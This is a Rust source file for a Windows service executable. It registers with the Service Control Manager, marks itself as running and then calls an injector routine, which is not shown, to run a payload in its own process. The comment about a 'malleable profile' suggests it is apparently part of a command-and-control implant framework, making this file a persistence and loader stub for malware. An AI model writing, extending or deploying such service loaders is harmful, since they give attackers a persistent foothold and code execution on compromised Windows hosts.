#![no_std]
#![no_main]

use crate::injector::inject_current_process;
use windows_sys::{
    Win32::{
        Foundation::{ERROR_SUCCESS, FALSE},
        System::Services::{
            RegisterServiceCtrlHandlerW, SERVICE_RUNNING, SERVICE_STATUS,
            SERVICE_STATUS_CURRENT_STATE, SERVICE_STATUS_HANDLE, SERVICE_TABLE_ENTRYW,
            SERVICE_WIN32_OWN_PROCESS, SetServiceStatus, StartServiceCtrlDispatcherW,
        },
    },
    core::PWSTR,
};

mod injector;

#[cfg_attr(not(test), panic_handler)]
#[allow(unused)]
fn panic(_info: &core::panic::PanicInfo) -> ! {
    loop {}
}

/// Creates a service binary name, based on the malleable profile (or unwrap at comptime). The macro
/// returns a PWSTR (*mut u16) which can be used in place of a PWSTR in windows_sys
macro_rules! service_name_pwstr {
    () => {{
        let svc_name = option_env!("SVC_NAME").unwrap();
        const MAX_SVC_NAME_LEN: usize = 256;
        let mut buf = [0u16; MAX_SVC_NAME_LEN];
        let mut pos: usize = 0;
        for (i, c) in svc_name.encode_utf16().enumerate() {
            buf[i] = c;
            pos += 1;
        }

        // append null byte
        buf[pos] = 0u16;

        PWSTR::from(buf.as_mut_ptr())
    }};
}

#[unsafe(no_mangle)]
pub unsafe extern "system" fn ServiceMain(_: u32, _: *mut PWSTR) {
    svc_start();
}

fn svc_start() {
    // register the service with SCM
    let h_svc =
        unsafe { RegisterServiceCtrlHandlerW(service_name_pwstr!(), Some(service_handler)) };
    if h_svc.is_null() {
        return;
    }

    unsafe { update_service_status(h_svc, SERVICE_RUNNING) }

    inject_current_process();
}

unsafe extern "system" fn service_handler(control: u32) {
    match control {
        SERVICE_CONTROL_STOP => (),
        _ => {}
    }
}

fn main() {
    let service_table = [
        SERVICE_TABLE_ENTRYW {
            lpServiceName: service_name_pwstr!(),
            lpServiceProc: Some(ServiceMain),
        },
        SERVICE_TABLE_ENTRYW::default(),
    ];

    unsafe {
        if StartServiceCtrlDispatcherW(service_table.as_ptr()) == FALSE {
            return;
        }
    }
}

pub unsafe fn update_service_status(h_status: SERVICE_STATUS_HANDLE, state: u32) {
    let mut service_status = SERVICE_STATUS {
        dwServiceType: SERVICE_WIN32_OWN_PROCESS,
        dwCurrentState: SERVICE_STATUS_CURRENT_STATE::from(state),
        dwControlsAccepted: if state == SERVICE_RUNNING { 1 } else { 0 },
        dwWin32ExitCode: ERROR_SUCCESS,
        dwServiceSpecificExitCode: 0,
        dwCheckPoint: 0,
        dwWaitHint: 0,
    };

    unsafe {
        let _ = SetServiceStatus(h_status, &mut service_status);
    }
}
